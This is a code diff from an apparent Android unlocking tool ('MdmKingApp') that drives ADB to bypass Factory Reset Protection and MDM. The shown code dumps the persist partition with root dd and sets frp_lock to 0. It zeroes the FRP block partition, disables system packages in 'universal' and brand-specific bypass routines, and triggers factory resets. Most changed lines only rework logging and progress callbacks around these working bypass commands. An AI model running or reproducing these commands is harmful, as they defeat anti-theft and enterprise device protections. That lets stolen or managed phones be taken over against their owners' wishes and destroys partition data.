+                    self.log(f'[+] STAGE=KG_STATE STATUS=OK EVENT=persist_partition_found DEVICE={persist_dev}', 's')
                     tmp = '/data/local/tmp/persist_kg.img'
                     sh(f'su -c "dd if={persist_dev} of={tmp} bs=1M 2>/dev/null"')
                     sh(f'su -c "chmod 666 {tmp}"')
@@ -9009,11 +9280,15 @@ class MdmKingApp:
         subprocess.run([adb, '-s', s, 'shell', 'content insert --uri content://settings/secure --bind name:s:skip_first_use_hint --bind value:s:1 2>/dev/null'], timeout=3, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'content insert --uri content://settings/secure --bind name:s:frp_lock --bind value:s:0 2>/dev/null'], timeout=3, creationflags=flags)
         subprocess.run([adb, '-s', s, 'shell', 'dd if=/dev/zero of=/dev/block/by-name/frp bs=1024 count=8 2>/dev/null'], timeout=5, creationflags=flags)
-        self.log('[*] Rebooting device...', 'h')
-        subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0 2>/dev/null'], timeout=3, capture_output=True, creationflags=flags)
-        subprocess.run([adb, '-s', s, 'reboot'], timeout=5, capture_output=True, creationflags=flags)
         self.log('[#] ━━━━━ BYPASS COMPLETE ━━━━━━━━━━━━━━━━━━━━━', 'c')
         self.log('[✓] Device rebooting — wait for it to come back online', 's')
+        if adb and s:
+            try: subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
+            except Exception: pass
+            try: subprocess.run([adb, '-s', s, 'reboot'], timeout=5, capture_output=True, creationflags=0x08000000)
+            except Exception: pass
+        self.root.after(0, lambda: self._finish_progress(True, 'FRP BYPASS COMPLETE'))
+        self.root.after(0, lambda: self.status_var.set('Done — FRP Bypass complete'))
 
     def _adb_factory_reset(self):
         self.log_section('ADB Factory Reset', 2)
@@ -9058,6 +9333,8 @@ class MdmKingApp:
         subprocess.run([adb, '-s', s, 'shell', 'reboot recovery'], timeout=30, creationflags=flags)
         self.log('[#] ━━━━━ DONE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'c')
         self.log('[✓] Factory reset sent — device rebooting to recovery', 's')
+        self.root.after(0, lambda: self._finish_progress(True, 'FACTORY RESET COMPLETE'))
+        self.root.after(0, lambda: self.status_var.set('Done — Factory Reset complete'))
 
     def _adb_read_info(self):
         adb = os.path.join(self._tools_dir(), 'adb.exe')
@@ -9346,7 +9623,7 @@ class MdmKingApp:
             self._show_flow_step('Device Info', 'ok')
             self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
             self._show_flow_step('Upload Data', 'ok')
-            self.log('BYPASSING', 'h')
+            self.log('[#] STAGE=UNIVERSAL_BYPASS STATUS=RUNNING OPERATION=executing', 'h')
             self._show_flow_step('Retreve info', 'ok')
             self._adb_bypass_core('UNIVERSAL', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'] + CHIPSET_PACKAGES['mtk'],
                 disable_pkgs=True, quiet=False)
@@ -9392,7 +9669,7 @@ class MdmKingApp:
             self._show_flow_step('Device Info', 'ok')
             self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
             self._show_flow_step('Upload Data', 'ok')
-            self.log('BYPASSING', 'h')
+            self.log('[#] STAGE=BRAND_BYPASS STATUS=RUNNING OPERATION=executing', 'h')
             self._show_flow_step('Retreve info', 'ok')
             self._adb_bypass_core(brand, packages + ['com.android.vending'],
                 disable_pkgs=True, quiet=False)
